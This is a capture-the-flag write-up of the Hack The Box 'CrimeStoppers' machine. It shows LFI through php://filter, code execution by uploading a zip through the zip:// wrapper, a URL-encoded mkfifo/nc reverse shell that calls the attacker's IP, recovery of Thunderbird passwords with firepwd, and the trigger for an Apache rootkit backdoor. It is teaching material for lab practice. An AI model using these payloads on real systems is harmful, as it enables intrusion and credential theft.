---
title: "Hack The Box - CrimeStoppers"
tags: [linux,hard,lfi,filter,zip,zip://,filter://,apache_modroot,rootkit,backdoor,thunderbird,imapmail,firepwd]
categories: HackTheBox-Linux
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled.png)

⇒ Crimestoppers is an hard difficulty machine made by ippsec which teaches us about :

- PHP Filter LFI
- PHP zip:// filter LFI for code exec
- Retrieving password from thunderbird files using firepwd
- apache_modrootme rootkit

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%201.png)

---

## Enumeration

⇒ So first off we are presented with the following page which has Home and Upload :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%202.png)

- Upload page takes name and tip parameter :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%203.png)

- We see an admin cookie that was set to **`0`** we changed it to **`1`** . Which gave us access to List page which has the uploads we created :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%204.png)

- We find an hyperlink on list page named Whiterose.txt. Which talks about a GET parameter being vulnerable to source code disclosure. It also says RCE is possible :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%205.png)

---

## Getting Source Code [ LFI ]

⇒ So the ?op parameter has filters that stops us from inputting **`../`** and **`%00`**. So after playing around with it we understand that it appends .php to the parameter we provided so we aren't able to escape it using the null byte filter : 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%206.png)

- We are able to read the source code using php://filter :

**`http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=home`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%207.png)

- We decoded it and we saw that it includes common.php

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%208.png)

⇒ **common.php** :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%209.png)

- So the filename is generated randomly and we only control HTTP_USER_AGENT . There's nothing vulnerable in this function sadly ☹️

⇒ **list.php** :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2010.png)

- So our tips are uploaded to /uploads/<our ip>/filename

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2011.png)

⇒ **upload.php**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2012.png)

- So the upload function takes the tip we have given and writes to the file in the folder

---

## Getting RCE [ zip filter ]

> PHP comes by default with several built-in wrappers for various URL-style protocols for use with the filesystem functions. Among those there are the compression wrappers such as **`zip://`** . This wrapper could allow one to unzip archives on the fly while providing access to the files stored in the archive. So if you abuse that LFI with a URL-style protocol such as **`zip://archive.zip#file.php`** you could potentially bypass this restrictions imposed by the code by uploading a ZIP archive with your PHP code inside of it and then executing it.

Reference : [https://pure.security/abusing-php-wrappers/](https://pure.security/abusing-php-wrappers/)

⇒ So we already know that it appends .php to the parameter we provide on ?op page. We can upload an zip file that contains an php script that allows to run commands. We will upload it by putting zip contents in the tip parameter. We will be using curl to upload it :

```php
curl -XPOST -F "tip=@enox.zip" -F "name=what" -F "token=f7ab6fe8906a56cc11bc34238be8d1f5efd324c2dceb7f216c512fdea8b17a5e" -F "submit=Send Tip" -H "Cookie: admin=1; PHPSESSID=f72kdra1sff97oi3egpj95m7e5" http://10.10.10.80/\?op\=upload --proxy http://127.0.0.1:8080
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2013.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2014.png)

⇒ Now we know the filename and where the zip file is uploaded to. So now we can unzip it and run commands on the system :

```php
http://10.10.10.80/?op=zip://uploads/10.10.14.15/cda3c3712e5777e3808d81691561a1e481da0e7a#enox&cmd=id
```

**`http://10.10.10.80/?op=zip://uploads/10.10.14.15/cda3c3712e5777e3808d81691561a1e481da0e7a%23enox&cmd=id`**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2015.png)

- Popping a shell :

```php
http://10.10.10.80/?op=zip://uploads/10.10.14.15/cda3c3712e5777e3808d81691561a1e481da0e7a%23enox&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7C%2Fbin%2Fnc%2010.10.14.15%201234%20%3E%2Ftmp%2Ff
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2016.png)

---

## Privilege Escalation to dom [ thunderbird ]

⇒ So we find thunderbird folder in user dom home folder. In which we find key3.db and login.json from which we can retrieve credentials using firepwd tool :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2017.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2017.png)

- Tool : [https://github.com/lclevy/firepwd](https://github.com/lclevy/firepwd)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2018.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2018.png)

**dom : Gummer59**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2019.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2019.png)

---

## Privilege Escalation to Root [ log & apache_modrootme ]

⇒ So we are in adm group which allows us to read logs in /var/log . We find the following interesting things :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2020.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2020.png)

⇒ Back in the thunderbird folder there's ImapMail folder which has the mails. We find interesting mail talking about apache_modrootme backdoor :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2021.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2021.png)

- So we just have to **`nc localhost 80`** and type **`get root`**

⇒ We nc put get root doesnt work. But we previously found string named FunSociety which works and we get root shell :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2022.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/CrimeStoppers%20Box%2031351b80735e419a95a22aa07f981611/Untitled%2022.png)

---
